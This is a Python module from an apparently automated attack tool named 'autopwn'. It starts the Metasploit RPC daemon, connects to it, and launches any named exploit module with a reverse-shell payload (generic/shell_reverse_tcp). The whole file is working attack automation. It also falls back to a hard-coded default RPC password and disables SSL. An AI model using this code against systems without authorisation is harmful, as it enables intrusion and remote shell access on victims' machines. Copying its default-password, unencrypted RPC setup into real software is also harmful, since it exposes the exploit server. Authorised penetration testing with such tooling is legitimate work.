from __future__ import annotations
import asyncio
import logging
import os
from typing import Optional

logger = logging.getLogger("autopwn.msf")

_msf_client = None
_msf_lock = asyncio.Lock()


def _get_msf_password() -> str:
    """Read at call time so .env and test overrides work."""
    return os.getenv("MSF_PASSWORD", "autopwn_msf_pass")


async def get_msf_client(host: str = "127.0.0.1", port: int = 55553,
                          user: str = "msf", password: str = None):
    global _msf_client
    if password is None:
        password = _get_msf_password()
    async with _msf_lock:
        if _msf_client is not None:
            return _msf_client
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            client = MsfRpcClient(password, server=host, port=port,
                                  username=user, ssl=False)
            _msf_client = client
            logger.info("Connected to Metasploit MSFRPC")
            return client
        except Exception as e:
            logger.warning(f"Metasploit MSFRPC not available: {e}")
            return None


async def run_exploit(module: str, options: dict,
                      host: str = "127.0.0.1", port: int = 55553,
                      user: str = "msf", password: str = None) -> Optional[str]:
    if password is None:
        password = _get_msf_password()
    client = await get_msf_client(host, port, user, password)
    if not client:
        return None
    try:
        exploit = client.modules.use("exploit", module)
        for k, v in options.items():
            exploit[k] = v
        exploit.execute(payload="generic/shell_reverse_tcp")
        logger.info(f"Launched MSF exploit: {module}")
        return "launched"
    except Exception as e:
        logger.error(f"MSF exploit error: {e}")
        return None


async def ensure_msfrpcd():
    """Start msfrpcd if not already running."""
    try:
        proc = await asyncio.create_subprocess_exec(
            "pgrep", "-f", "msfrpcd",
            stdout=asyncio.subprocess.PIPE,
        )
        await proc.communicate()
        if proc.returncode == 0:
            logger.info("msfrpcd already running")
            return

        pwd = _get_msf_password()
        logger.info("Starting msfrpcd...")
        await asyncio.create_subprocess_exec(
            "msfrpcd", "-P", pwd, "-S",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        # Poll until ready — up to 60s with 2s steps
        for _ in range(30):
            await asyncio.sleep(2)
            try:
                from pymetasploit3.msfrpc import MsfRpcClient
                MsfRpcClient(pwd, server="127.0.0.1", port=55553, ssl=False)
                logger.info("msfrpcd ready")
                return
            except Exception:
                pass
        logger.warning("msfrpcd did not become ready within 60s")
    except Exception as e:
        logger.warning(f"Could not start msfrpcd: {e}")
